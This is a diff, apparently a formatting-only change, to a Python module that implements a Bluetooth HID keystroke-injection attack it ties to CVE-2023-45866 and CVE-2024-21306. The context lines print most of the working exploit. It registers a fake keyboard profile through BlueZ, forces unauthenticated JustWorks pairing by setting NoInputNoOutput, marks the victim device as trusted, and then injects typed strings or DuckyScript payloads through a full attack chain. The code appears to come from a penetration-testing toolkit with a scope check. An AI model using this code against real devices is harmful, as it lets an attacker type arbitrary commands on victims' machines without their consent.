@@ -38,6 +38,7 @@ logger = structlog.get_logger(__name__)
 
 class BTKeyboardType(Enum):
     """Target keyboard types for HID injection."""
+
     GENERIC = "generic"
     APPLE = "apple"
     MICROSOFT = "microsoft"
@@ -47,6 +48,7 @@ class BTKeyboardType(Enum):
 @dataclass
 class BTHIDTarget:
     """Bluetooth HID target device."""
+
     address: str
     name: str | None = None
     alias: str | None = None
@@ -65,6 +67,7 @@ class BTHIDTarget:
 @dataclass
 class BTHIDConfig:
     """Configuration for Bluetooth HID attack."""
+
     adapter: str = "hci0"
     target_address: str = ""
     keyboard_type: BTKeyboardType = BTKeyboardType.GENERIC
@@ -81,6 +84,7 @@ class BTHIDConfig:
 @dataclass
 class BTHIDResult:
     """Result of Bluetooth HID operation."""
+
     success: bool
     target_address: str
     operation: str  # discover, connect, register_profile, inject
@@ -93,7 +97,7 @@ class BTHIDResult:
 class BlueZHIDProfile:
     """
     BlueZ HID Profile registration via D-Bus.
-    
+
     Registers a fake HID device (keyboard) profile with BlueZ
     so we can send HID reports over the interrupt channel.
     """
@@ -107,8 +111,12 @@ class BlueZHIDProfile:
         self.config = config
         self.adapter = config.adapter
         self.target_address = config.target_address
-        self.profile_path = f"/org/bluez/hid_profile_{self.target_address.replace(':', '_').upper()}"
-        self.device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+        self.profile_path = (
+            f"/org/bluez/hid_profile_{self.target_address.replace(':', '_').upper()}"
+        )
+        self.device_path = (
+            f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+        )
 
         self.bus: MessageBus | None = None
         self.profile_registered = False
@@ -135,29 +143,29 @@ class BlueZHIDProfile:
             '<?xml version="1.0" encoding="UTF-8" ?>'
             "<record>"
             '<attribute id="0x0001">'  # ServiceClassIDList
-            "<sequence><uuid value=\"0x1124\" /></sequence>"
+            '<sequence><uuid value="0x1124" /></sequence>'
             "</attribute>"
             '<attribute id="0x0004">'  # ProtocolDescriptorList
             "<sequence>"
-            "<sequence><uuid value=\"0x0100\" /><uint16 value=\"0x0011\" /></sequence>"
-            "<sequence><uuid value=\"0x0011\" /></sequence>"
+            '<sequence><uuid value="0x0100" /><uint16 value="0x0011" /></sequence>'
+            '<sequence><uuid value="0x0011" /></sequence>'
             "</sequence>"
             "</attribute>"
             '<attribute id="0x0005">'  # BrowseGroupList
-            "<sequence><uuid value=\"0x1002\" /></sequence>"
+            '<sequence><uuid value="0x1002" /></sequence>'
             "</attribute>"
             '<attribute id="0x0006">'  # LanguageBaseAttributeIDList
-            "<sequence><uint16 value=\"0x656e\" /><uint16 value=\"0x006a\" />"
-            "<uint16 value=\"0x0100\" /></sequence>"
+            '<sequence><uint16 value="0x656e" /><uint16 value="0x006a" />'
+            '<uint16 value="0x0100" /></sequence>'
             "</attribute>"
             '<attribute id="0x0009">'  # BluetoothProfileDescriptorList
-            "<sequence><sequence><uuid value=\"0x1124\" />"
-            "<uint16 value=\"0x0100\" /></sequence></sequence>"
+            '<sequence><sequence><uuid value="0x1124" />'
+            '<uint16 value="0x0100" /></sequence></sequence>'
             "</attribute>"
             '<attribute id="0x000d">'  # AdditionalProtocolDescriptorList (interrupt)
             "<sequence><sequence>"
-            "<sequence><uuid value=\"0x0100\" /><uint16 value=\"0x0013\" /></sequence>"
-            "<sequence><uuid value=\"0x0011\" /></sequence>"
+            '<sequence><uuid value="0x0100" /><uint16 value="0x0013" /></sequence>'
+            '<sequence><uuid value="0x0011" /></sequence>'
             "</sequence></sequence>"
             "</attribute>"
             '<attribute id="0x0100"><text value="Urban HID Keyboard" /></attribute>'
@@ -170,16 +178,16 @@ class BlueZHIDProfile:
             '<attribute id="0x0205"><boolean value="true" /></attribute>'  # HIDReconnectInitiate
             '<attribute id="0x0206">'  # HIDDescriptorList
             "<sequence><sequence>"
-            "<uint8 value=\"0x22\" />"
-            "<text encoding=\"hex\" value=\""
+            '<uint8 value="0x22" />'
+            '<text encoding="hex" value="'
             "05010906a101850175019508050719e029e7150025019508810295017508810395057501"
             "050819012905910295037503910395067508150026ff000507190029ff8100c0"
-            "\" />"
+            '" />'
             "</sequence></sequence>"
             "</attribute>"
             '<attribute id="0x0207">'  # HIDLANGIDBaseList
-            "<sequence><sequence><uint16 value=\"0x0409\" />"
-            "<uint16 value=\"0x0100\" /></sequence></sequence>"
+            '<sequence><sequence><uint16 value="0x0409" />'
+            '<uint16 value="0x0100" /></sequence></sequence>'
             "</attribute>"
             '<attribute id="0x020b"><uint16 value="0x0100" /></attribute>'  # HIDProfileVersion
             '<attribute id="0x020d"><boolean value="true" /></attribute>'  # HIDBootDevice
@@ -189,7 +197,9 @@ class BlueZHIDProfile:
     async def _get_manager_iface(self):
         """Get ProfileManager1 interface."""
         bus = await self._get_bus()
-        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
+        obj = bus.get_proxy_object(
+            "org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez")
+        )
         return obj.get_interface("org.bluez.ProfileManager1")
 
     async def register(self) -> BTHIDResult:
@@ -217,7 +227,7 @@ class BlueZHIDProfile:
                 success=True,
                 target_address=self.target_address,
                 operation="register_profile",
-                message="HID profile registered successfully"
+                message="HID profile registered successfully",
             )
 
         except DBusError as e:
@@ -227,7 +237,7 @@ class BlueZHIDProfile:
                 success=False,
                 target_address=self.target_address,
                 operation="register_profile",
-                error=error_msg
+                error=error_msg,
             )
 
     async def unregister(self) -> BTHIDResult:
@@ -237,7 +247,7 @@ class BlueZHIDProfile:
                 success=False,
                 target_address=self.target_address,
                 operation="unregister_profile",
-                error="Profile not registered"
+                error="Profile not registered",
             )
 
         try:
@@ -250,21 +260,21 @@ class BlueZHIDProfile:
                 success=True,
                 target_address=self.target_address,
                 operation="unregister_profile",
-                message="HID profile unregistered"
+                message="HID profile unregistered",
             )
         except DBusError as e:
             return BTHIDResult(
                 success=False,
                 target_address=self.target_address,
                 operation="unregister_profile",
-                error=str(e)
+                error=str(e),
             )
 
 
 class BTHIDAttacker:
     """
     Bluetooth HID Keystroke Injection Attacker.
-    
+
     Implements CVE-2023-45866 / CVE-2024-21306:
     - Connects to target via Bluetooth HID profile without authentication
     - Sends keystrokes over L2CAP interrupt channel
@@ -292,7 +302,9 @@ class BTHIDAttacker:
     async def _get_device_proxy(self, device_path: str):
         """Get device proxy with introspection."""
         bus = await self._get_bus()
-        return bus.get_proxy_object("org.bluez", device_path, await self.bus.introspect("org.bluez", device_path))
+        return bus.get_proxy_object(
+            "org.bluez", device_path, await self.bus.introspect("org.bluez", device_path)
+        )
 
     async def _get_props_iface(self, proxy):
         return proxy.get_interface("org.freedesktop.DBus.Properties")
@@ -302,23 +314,33 @@ class BTHIDAttacker:
 
     async def _get_adapter_iface(self, adapter: str):
         bus = await self._get_bus()
-        proxy = bus.get_proxy_object("org.bluez", f"/org/bluez/{adapter}", await bus.introspect("org.bluez", f"/org/bluez/{adapter}"))
+        proxy = bus.get_proxy_object(
+            "org.bluez",
+            f"/org/bluez/{adapter}",
+            await bus.introspect("org.bluez", f"/org/bluez/{adapter}"),
+        )
         return proxy.get_interface("org.bluez.Adapter1")
 
     async def _get_manager_iface(self):
         bus = await self._get_bus()
-        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
+        obj = bus.get_proxy_object(
+            "org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez")
+        )
         return obj.get_interface("org.bluez.ProfileManager1")
 
     async def _get_object_manager_iface(self):
         bus = await self._get_bus()
-        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
+        obj = bus.get_proxy_object(
+            "org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez")
+        )
         return obj.get_interface("org.freedesktop.DBus.ObjectManager")
 
     async def discover_target(self) -> BTHIDResult:
         """Discover and validate target device for HID attack."""
         try:
-            device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+            device_path = (
+                f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+            )
             proxy = await self._get_device_proxy(device_path)
             props_iface = await self._get_props_iface(proxy)
 
@@ -351,13 +373,13 @@ class BTHIDAttacker:
                 if manu_data:
                     for key, value in manu_data.items():
                         # Apple: 0x004c
-                        if key == 0x004c:
+                        if key == 0x004C:
                             keyboard_type = BTKeyboardType.APPLE
                         # Microsoft: 0x0006
                         elif key == 0x0006:
                             keyboard_type = BTKeyboardType.MICROSOFT
                         # Logitech: 0x000d
-                        elif key == 0x000d:
+                        elif key == 0x000D:
                             keyboard_type = BTKeyboardType.LOGITECH
             except Exception:
                 pass
@@ -374,11 +396,13 @@ class BTHIDAttacker:
                 manufacturer_id=manufacturer_id,
             )
 
-            logger.info("Target discovered",
-                       address=address,
-                       name=name,
-                       hid_supported=hid_supported,
-                       keyboard_type=keyboard_type.value)
+            logger.info(
+                "Target discovered",
+                address=address,
+                name=name,
+                hid_supported=hid_supported,
+                keyboard_type=keyboard_type.value,
+            )
 
             return BTHIDResult(
                 success=True,
@@ -392,7 +416,7 @@ class BTHIDAttacker:
                     "hid_supported": hid_supported,
                     "keyboard_type": keyboard_type.value,
                     "uuids": uuids,
-                }
+                },
             )
 
         except Exception as e:
@@ -400,7 +424,7 @@ class BTHIDAttacker:
                 success=False,
                 target_address=self.target_address,
                 operation="discover",
-                error=str(e)
+                error=str(e),
             )
 
     async def connect_target(self) -> BTHIDResult:
@@ -410,18 +434,22 @@ class BTHIDAttacker:
                 success=False,
                 target_address=self.target_address,
                 operation="connect",
-                error="Target not discovered"
+                error="Target not discovered",
             )
 
         try:
-            device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+            device_path = (
+                f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+            )
             proxy = await self._get_device_proxy(device_path)
             device_iface = proxy.get_interface("org.bluez.Device1")
 
             # Force NoInputNoOutput capability BEFORE pairing for CVE-2023-45866 OTA
             # This forces JustWorks pairing (no authentication)
             try:
-                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Capabilities", 0x0000)  # NoInputNoOutput
+                await proxy.get_interface("org.bluez.Device1").Set(
+                    "org.bluez.Device1", "Capabilities", 0x0000
+                )  # NoInputNoOutput
                 logger.info("Set NoInputNoOutput capability for CVE-2023-45866 OTA")
             except Exception as e:
                 logger.warning("Could not set NoInputNoOutput capability pre-pairing", error=str(e))
@@ -430,7 +458,9 @@ class BTHIDAttacker:
                 logger.info("Already paired, connecting", address=self.target_address)
                 await device_iface.Connect()
             else:
-                logger.info("Pairing with target (JustWorks/NoInputNoOutput)", address=self.target_address)
+                logger.info(
+                    "Pairing with target (JustWorks/NoInputNoOutput)", address=self.target_address
+                )
                 await device_iface.Pair()
                 # Wait for pairing
                 await asyncio.sleep(3)
@@ -438,7 +468,9 @@ class BTHIDAttacker:
                 # Set as trusted
                 proxy = await self._get_device_proxy(device_path)
                 props_iface = proxy.get_interface("org.freedesktop.DBus.Properties")
-                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Trusted", True)
+                await proxy.get_interface("org.bluez.Device1").Set(
+                    "org.bluez.Device1", "Trusted", True
+                )
 
             # Wait for connection
             proxy = await self._get_device_proxy(device_path)
@@ -456,7 +488,7 @@ class BTHIDAttacker:
                     success=False,
                     target_address=self.target_address,
                     operation="connect",
-                    error="Connection timeout"
+                    error="Connection timeout",
                 )
 
             logger.info("Target connected", address=self.target_address)
@@ -465,7 +497,7 @@ class BTHIDAttacker:
                 success=True,
                 target_address=self.target_address,
                 operation="connect",
-                message="Connected successfully"
+                message="Connected successfully",
             )
 
         except Exception as e:
@@ -476,13 +508,13 @@ class BTHIDAttacker:
                     success=True,
                     target_address=self.target_address,
                     operation="connect",
-                    message="Already connected"
+                    message="Already connected",
                 )
             return BTHIDResult(
                 success=False,
                 target_address=self.target_address,
                 operation="connect",
-                error=error_msg
+                error=error_msg,
             )
 
     async def register_hid_profile(self) -> BTHIDResult:
@@ -501,14 +533,14 @@ class BTHIDAttacker:
                 success=success,
                 target_address=self.target_address,
                 operation="inject_keystroke",
-                message=f"Key {keycode} injected locally" if success else "Injection failed"
+                message=f"Key {keycode} injected locally" if success else "Injection failed",
             )
         except Exception as e:
             return BTHIDResult(
                 success=False,
                 target_address=self.target_address,
                 operation="inject_keystroke",
-                error=str(e)
+                error=str(e),
             )
 
     async def inject_string(self, text: str, delay_ms: int = 10) -> BTHIDResult:
@@ -523,14 +555,14 @@ class BTHIDAttacker:
                 success=success,
                 target_address=self.target_address,
                 operation="inject_string",
-                message=f"Injected {len(text)} characters" if success else "Injection failed"
+                message=f"Injected {len(text)} characters" if success else "Injection failed",
             )
         except Exception as e:
             return BTHIDResult(
                 success=False,
                 target_address=self.target_address,
                 operation="inject_string",
-                error=str(e)
+                error=str(e),
             )
 
     async def run_ducky_script(self, script: str) -> BTHIDResult:
@@ -548,28 +580,30 @@ class BTHIDAttacker:
             if cmd.type == DuckyCommandType.DELAY:
                 await asyncio.sleep(int(cmd.args[0]) / 1000.0 if cmd.args else 0)
             elif cmd.type == DuckyCommandType.STRING:
-                text = ' '.join(cmd.args)
+                text = " ".join(cmd.args)
                 result = await self.injector.type_string(text)
                 if not result:
                     return BTHIDResult(
                         success=False,
                         target_address=self.target_address,
                         operation="run_ducky",
-                        error=f"STRING command failed: {text}"
+                        error=f"STRING command failed: {text}",
                     )
 
         return BTHIDResult(
             success=True,
             target_address=self.target_address,
             operation="run_ducky",
-            message="DuckyScript executed successfully"
+            message="DuckyScript executed successfully",
         )
 
     async def disconnect(self) -> BTHIDResult:
         """Disconnect from target and cleanup."""
         try:
             if self.connected:
-                device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+                device_path = (
+                    f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
+                )
                 proxy = await self._get_device_proxy(device_path)
                 device_iface = proxy.get_interface("org.bluez.Device1")
                 await device_iface.Disconnect()
@@ -585,24 +619,22 @@ class BTHIDAttacker:
                 success=True,
                 target_address=self.target_address,
                 operation="disconnect",
-                message="Disconnected successfully"
+                message="Disconnected successfully",
             )
         except Exception as e:
             return BTHIDResult(
                 success=False,
                 target_address=self.target_address,
                 operation="disconnect",
-                error=str(e)
+                error=str(e),
             )
 
     async def run_full_attack(
-        self,
-        payload: str | None = None,
-        progress_callback: Callable[[str], None] | None = None,
+        self, payload: str | None = None, progress_callback: Callable[[str], None] | None = None
     ) -> BTHIDResult:
         """
         Run complete HID injection attack chain.
-        
+
         1. Discover target
         2. Connect/pair
         3. Register HID profile
@@ -622,7 +654,13 @@ class BTHIDAttacker:
         result = await self.discover_target()
         if not result.success:
             log_step("discover", "failed", result.error or "Unknown error")
-            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
+            return BTHIDResult(
+                success=False,
+                target_address=self.target_address,
+                operation="full_attack",
+                error=result.error,
+                details={"steps": steps},
+            )
         log_step("discover", "success", result.message)
 
         # Step 2: Connect
@@ -630,7 +668,13 @@ class BTHIDAttacker:
         result = await self.connect_target()
         if not result.success:
             log_step("connect", "failed", result.error or "Unknown error")
-            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
+            return BTHIDResult(
+                success=False,
+                target_address=self.target_address,
+                operation="full_attack",
+                error=result.error,
+                details={"steps": steps},
+            )
         log_step("connect", "success", result.message)
 
         # Step 3: Register HID profile
@@ -638,7 +682,13 @@ class BTHIDAttacker:
         result = await self.register_hid_profile()
         if not result.success:
             log_step("register_profile", "failed", result.error or "Unknown error")
-            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
+            return BTHIDResult(
+                success=False,
+                target_address=self.target_address,
+                operation="full_attack",
+                error=result.error,
+                details={"steps": steps},
+            )
         log_step("register_profile", "success", result.message)
 
         # Step 4: Inject payload
@@ -652,7 +702,13 @@ class BTHIDAttacker:
 
         if not result.success:
             log_step("inject", "failed", result.error or "Unknown error")
-            return BTHIDResult(success=False, target_address=self.target_address, operation="full_attack", error=result.error, details={"steps": steps})
+            return BTHIDResult(
+                success=False,
+                target_address=self.target_address,
+                operation="full_attack",
+                error=result.error,
+                details={"steps": steps},
+            )
         log_step("inject", "success", result.message)
 
         # Step 5: Disconnect
@@ -665,7 +721,7 @@ class BTHIDAttacker:
             target_address=self.target_address,
             operation="full_attack",
             message="Full attack chain completed successfully",
-            details={"steps": steps}
+            details={"steps": steps},
         )
 
 
@@ -686,7 +742,9 @@ class BTHIDScanner:
         try:
             bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
             adapter_path = f"/org/bluez/{self.adapter}"
-            adapter_proxy = bus.get_proxy_object("org.bluez", adapter_path, await bus.introspect("org.bluez", adapter_path))
+            adapter_proxy = bus.get_proxy_object(
+                "org.bluez", adapter_path, await bus.introspect("org.bluez", adapter_path)
+            )
             adapter_iface = adapter_proxy.get_interface("org.bluez.Adapter1")
 
             # Start discovery
@@ -701,7 +759,9 @@ class BTHIDScanner:
 
             # Get all discovered devices
             manager_path = "/org/bluez"
-            manager_proxy = bus.get_proxy_object("org.bluez", manager_path, await bus.introspect("org.bluez", manager_path))
+            manager_proxy = bus.get_proxy_object(
+                "org.bluez", manager_path, await bus.introspect("org.bluez", manager_path)
+            )
             manager_iface = manager_proxy.get_interface("org.freedesktop.DBus.ObjectManager")
             objects = await manager_iface.GetManagedObjects()
 
@@ -730,7 +790,11 @@ class BTHIDScanner:
                     targets.append(target)
                     self.targets[address] = target
 
-            logger.info("BT HID scan completed", devices_found=len(targets), hid_capable=sum(1 for t in targets if t.hid_supported))
+            logger.info(
+                "BT HID scan completed",
+                devices_found=len(targets),
+                hid_capable=sum(1 for t in targets if t.hid_supported),
+            )
             return targets
 
         except Exception as e:
@@ -741,6 +805,7 @@ class BTHIDScanner:
 # ============================================================
 # Convenience Functions
 # ============================================================
+
 
 async def bt_hid_attack(
     target_address: str,
@@ -759,9 +824,7 @@ async def bt_hid_attack(
     get_active_scope().validate(target_address, "bluetooth_hid")
 
     config = BTHIDConfig(
-        adapter=adapter,
-        target_address=target_address,
-        keyboard_type=keyboard_type,
+        adapter=adapter, target_address=target_address, keyboard_type=keyboard_type
     )
     attacker = BTHIDAttacker(config)
     return await attacker.run_full_attack(payload=payload)
